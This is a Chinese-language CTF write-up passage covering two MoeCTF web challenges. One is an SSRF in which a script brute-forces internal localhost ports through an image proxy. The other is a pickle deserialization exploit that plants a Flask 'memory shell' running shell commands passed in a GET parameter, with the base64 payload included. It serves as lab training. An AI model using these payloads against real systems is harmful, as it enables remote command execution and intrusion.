<p>在题目中，点明了跑了两个服务，一个内部云，一个外部云。那么我们能看到的无疑就是外部云了，通过url的请求确定是<code>app.py</code>文件的源码
，所以<code>app2.py</code>就是内部云的源码</p> <p>主要区别:</p> <p>内部云<code>app2.py</code>，通过<code>/image/&lt;filename&gt;</code>路由，访问<code>uploads/</code>目录下的<code>filename</code>文件</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/image/&lt;filename&gt;'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">load_image</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>
        mime <span class="token operator">=</span> get_mimetype<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>
        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> mimetype<span class="token operator">=</span>mime<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'文件未找到'</span><span class="token punctuation">,</span> <span class="token number">404</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>外部云<code>app.py</code>，通过get参数<code>url</code>访问static目录下的文件，我们上传的图片也只能通过外部云访问，如果能通过ssrf找到内部云端口，可以利用外部云调用内部云<code>/image/&lt;filename&gt;</code>接口访问<code>uploads/flag.jpg</code></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/image'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">load_image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'URL 参数缺失'</span><span class="token punctuation">,</span> <span class="token number">400</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        response<span class="token punctuation">.</span>raise_for_status<span class="token punctuation">(</span><span class="token punctuation">)</span>
        img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>

        img_io <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
        img<span class="token punctuation">.</span>save<span class="token punctuation">(</span>img_io<span class="token punctuation">,</span> img<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">)</span>
        img_io<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>img_io<span class="token punctuation">,</span> mimetype<span class="token operator">=</span>img<span class="token punctuation">.</span>get_format_mimetype<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f&quot;无法加载图片: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">,</span> <span class="token number">400</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>关键部分，这里可以看到，端口随机开的。怀着愧疚之心狠狠的爆破了一下，因为内部外部云在同一目录，所以利用外部云的url访问内部云</p> <p>通过回显不同，发现内部云跑在了<code>5043</code>端口</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">)</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">)</span>
    port <span class="token operator">=</span> find_free_port_in_range<span class="token punctuation">(</span><span class="token number">5001</span><span class="token punctuation">,</span> <span class="token number">6000</span><span class="token punctuation">)</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span>port<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>简单爆破脚本，内部云的路径是随便写的，能返回<code>无法加载图片: 404 Client Error: NOT FOUND for url: http://localhost:5122/uploads/flag</code>和<code>无法加载图片: HTTPConnectionPool(host='localhost', port=5432): Max retries exceeded with url: /uploads/flag.jpg (Caused by NewConnectionError(': Failed to establish a new connection: [Errno 111] Connection refused'))</code>或者静态目录下存在的文件，可以确定端口，
回显可以区别开就行</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> time
<span class="token keyword">import</span> requests


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">,</span><span class="token number">6000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;http://127.0.0.1:60084/image?url=http://localhost:</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">/static/0_11.png&quot;</span></span>
    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><img src="/medias/moectf/24.png" alt="24"></p> <p><img src="/medias/moectf/25.png" alt="25"></p> <h2 id="petstore"><a href="#petstore" class="header-anchor">#</a> PetStore</h2> <p>太强了太强了！！做起来太爽了，强烈强烈强烈强烈建议这题拿到附件在本地跑一下，用pycharm打断点，看看反序列化哪里问题，不然根本看不出来。</p> <p>讲一下官方做法，通过反序列化执行命令，直接命令执行利用<code>store.create_pet()</code>方法，把命令执行的结果作为<code>pet</code>对象的参数传进去了</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64


<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">&quot;import os;store.create_pet(os.popen('ls').read(),'flag')&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

pet <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
serialized_pet <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>pet<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>serialized_pet<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>下面讲讲我的思路，因为没有想到通过执行命令把结果作为参数来创建对象，所以我的测试过程没有回显，思路有点偏，注册动态路由打了一个内存马。</p> <p>审计源码，发现反序列化漏洞，通过本地重写<code>__reduce__</code>方法，构造<code>payload</code>，打过去</p> <p>漏洞部分<code>pet = pickle.loads(pet_data)</code></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>    <span class="token keyword">def</span> <span class="token function">import_pet</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> serialized_pet<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            pet_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>serialized_pet<span class="token punctuation">)</span>
            pet <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>pet_data<span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>pet<span class="token punctuation">,</span> Pet<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> i <span class="token keyword">in</span> self<span class="token punctuation">.</span>pets<span class="token punctuation">:</span>
                    <span class="token keyword">if</span> i<span class="token punctuation">.</span>uuid <span class="token operator">==</span> pet<span class="token punctuation">.</span>uuid<span class="token punctuation">:</span>
                        <span class="token keyword">return</span> <span class="token boolean">False</span>
                self<span class="token punctuation">.</span>pets<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pet<span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token boolean">True</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>因为提交反序列化的payload后，服务器返回<code>{&quot;error&quot;:&quot;Failed to import pet&quot;}</code>，一直不成功，折腾了一会老实了，拿到pycharm本地调试，发现题目确实反序列化了，只是反序列化的结果是eval导入的popen函数，不再是要求的对象，所以报错，不过没关系，提交的payload他都执行了，只是没有回显</p> <p><img src="/medias/moectf/26.png" alt="26"></p> <p>断点调试找到问题，可以看到，反序列化后，pet是一个函数对象，已经执行了命令，由于不再是Pet对象，所以抛出异常返回false，最后页面打印了<code>{&quot;error&quot;: &quot;Failed to import pet&quot;}</code>，所以说，这里反序列化命令执行是成功的，只是没有回显</p> <p><img src="/medias/moectf/27.png" alt="27"></p> <p>考虑到题目环境没有导入os库，使用eval函数动态导入一下。因为题目不能出网，又没有回显，翻了很多文章，找到<code>gxngxngxn师傅</code>一篇关于注册动态路由、内存马的文章<a href="https://www.cnblogs.com/gxngxngxn/p/18181936" target="_blank" rel="noopener noreferrer">新版FLASK下python内存马的研究<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>exp</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> uuid


<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 生成内存马，get参数cola</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>
        <span class="token string">&quot;__import__(\&quot;sys\&quot;).modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda :__import__('os').popen(request.args.get('cola')).read())&quot;</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

pet <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
serialized_pet <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>pet<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>serialized_pet<span class="token punctuation">)</span>
<span class="token comment"># gASVwwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIynX19pbXBvcnRfXygic3lzIikubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLCBbXSkuYXBwZW5kKGxhbWJkYSA6X19pbXBvcnRfXygnb3MnKS5wb3BlbihyZXF1ZXN0LmFyZ3MuZ2V0KCdjb2xhJykpLnJlYWQoKSmUhZRSlC4=</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>serialized_pet<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>最后<code>url/import?cola=env</code>拿到flag</p> <p><img src="/medias/moectf/28.png" alt="28"></p></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/Apursuit/Apursuit.github.io/edit/master/docs/01.wp/09.moectf.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <div class="last-updated"><span class="prefix">最后一次更新于:</span> <span class="time">2025/10/08, 22:34:57</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/969484/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">buu 部分flask题目</div></a> <a href="/pages/24d392/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">buu一道简单java web</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/969484/" class="prev">buu 部分flask题目</a></span> <span class="next"><a href="/pages/24d392/">buu一道简单java web</a>→
      </span></p></div></div></div> <!----></main></div> <div class="footer"><div class="icons"><a href="mailto:admin@gmail.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/Apursuit" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2024-2026
    <span></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <!----> <!----> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.dd92e586.js" defer></script><script src="/assets/js/2.1b31a38c.js" defer></script><script src="/assets/js/13.a867320c.js" defer></script>
  </body>
</html>
